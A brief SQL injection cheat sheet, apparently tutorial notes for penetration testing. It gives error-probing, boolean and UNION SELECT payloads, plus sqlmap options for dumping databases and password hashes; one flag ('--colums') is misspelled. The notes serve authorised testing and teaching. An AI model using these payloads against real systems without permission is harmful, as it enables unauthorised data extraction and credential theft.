# SQL injection

Inject SQL into a query parameter.

## Initial test

Check for errors or changes in output.

`'`

## Boolean test

Check if you can control output based on TRUE/FALSE statements.

You can use this to ask the database yes/no questions, e.g. "is the first letter of the first database 'a'?".

- `' OR '1'='1'; -- -`
- `' OR '1'='2'; -- -`
- `' AND '1'='1'; -- -`
- `' AND '1'='2'; -- -`

Consider leaving the original parameter before the boolean test, e.g. `123' AND '1'='2'; -- -`

## UNION test

Check if it's possible to dump SQL data into the HTML response.

Add `null` or static values to find the correct number of fields.

- `' UNION SELECT user(); -- -'`
- `' UNION SELECT user(), null; -- -'`
- `' UNION SELECT user(), 'a', 'b'; -- -`

If you need to leave the original parameter, combine with a false boolean test, e.g. `123' AND '1'='2' UNION SELECT user(); -- -`

## sqlmap

Manually verify a vulnerability before using sqlmap. This lets you set the right technique, which saves time.

Options:

- `--technique=B` sets technique to boolean (B) or UNION (U)
- `--dbs` or `-D=<DATABASE>` lists or chooses database.
- `--tables` or `-T=<TABLE>` lists or chooses table.
- `--colums` or `-C=<COLUMNS>` lists or chooses columns.
- `--dump` or `--dump-all` dumps SQL data.
- `--passwords` dumps password hashes.
- `-r` uses a request file.